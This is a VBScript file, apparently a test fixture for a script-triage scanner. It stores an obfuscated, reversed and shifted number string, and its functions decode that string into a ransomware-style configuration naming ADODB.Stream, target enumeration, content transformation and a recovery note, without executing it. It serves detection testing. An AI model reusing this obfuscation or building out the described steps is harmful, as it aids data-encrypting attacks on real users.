Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_4aaa8d3d = "141,145,141,71,124,122,81,78,123,80,122,77,70,107,94,111,104,92,94,107,86,126,134,122,135,120,126,141,136,135,149,125,126,132,124,136,133,71,123,73,74,122,127,71,86,135,136,130,140,135,126,141,145,126,149,74,125,124,124,73,126,75,80,122,75,70,135,128,130,122,137,134,122,124,86,125,130,120,135,128,130,122,137,134,122,124,149,75,86,141,135,142,136,124,120,126,128,122,141,140,149,134,122,126,139,141,108,71,91,93,104,93,90,86,139,126,141,137,122,125,122,149,126,141,136,135,120,146,139,126,143,136,124,126,139,120,126,141,130,139,144,69,141,135,126,141,135,136,124,120,134,139,136,127,140,135,122,139,141,69,140,141,126,128,139,122,141,120,126,141,122,139,126,134,142,135,126,86,140,137,126,141,140,149,74,86,143"
Const Codec_4aaa8d3d = "reversed_decimal|add_modulo_256|19"

Function Load_4aaa8d3d()
  Dim parts, result(), materialIndex
  parts = Split(Material_4aaa8d3d, ",")
  ReDim result(UBound(parts))
  For materialIndex = 0 To UBound(parts)
    result(UBound(parts) - materialIndex) = CInt(parts(materialIndex))
  Next
  Load_4aaa8d3d = result
End Function

Function Decode_4aaa8d3d(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = (storedMaterial(materialIndex) - 25 + 256) Mod 256
  Next
  Decode_4aaa8d3d = result
End Function

Function Recover_4aaa8d3d()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  harmlessValue = (19 * 7) - 133
  storedMaterial = Load_4aaa8d3d()
  Select Case 1
    Case 1
      recoveredMaterial = Decode_4aaa8d3d(storedMaterial)
    Case Else
      recoveredMaterial = Array()
  End Select
  configurationText = ""
  For materialIndex = 0 To UBound(recoveredMaterial)
    configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
  Next
  Recover_4aaa8d3d = configurationText
End Function

Function Inspect_4aaa8d3d()
  Inspect_4aaa8d3d = Recover_4aaa8d3d()
End Function
